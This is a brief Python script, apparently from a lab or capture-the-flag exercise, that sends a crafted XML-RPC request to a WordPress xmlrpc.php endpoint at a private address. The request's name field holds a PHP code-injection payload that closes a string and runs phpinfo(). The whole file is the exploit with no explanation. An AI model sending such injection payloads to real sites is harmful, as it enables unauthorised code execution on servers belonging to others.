import requests

xml = """
<?xml version="1.0"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params>
<param>
<value><name>','')); phpinfo(); exit;/*</name></value>
</param>
</params>
</methodCall> 
"""

headers = {'Content-type': 'application/xml'}

a = requests.post('http://10.10.10.29/wordpress/xmlrpc.php', data=xml, headers=headers)

print(a.status_code)
print(a.text)
